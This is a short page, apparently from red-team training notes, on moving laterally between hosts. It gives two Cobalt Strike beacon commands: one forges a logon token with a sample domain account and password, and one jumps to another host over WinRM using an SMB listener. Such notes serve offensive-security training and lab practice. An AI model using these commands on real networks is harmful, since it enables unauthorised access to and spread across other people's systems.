# Jumping Hosts





## Introduction

This page section will combine impersonation techniques found in the previous section "User Impersionation" with the actual techniques to establish connections on other hosts.







## Cobalt Strike&#x20;

### Jump

```bash
// Establish netonly Token (example)
beacon> make_token DEV\jking Qwerty123
// Jump (using SMB listener)
beacon> jump winrm64 sql-2.dev.cyberbotic.io Default_SMB_Listener
```
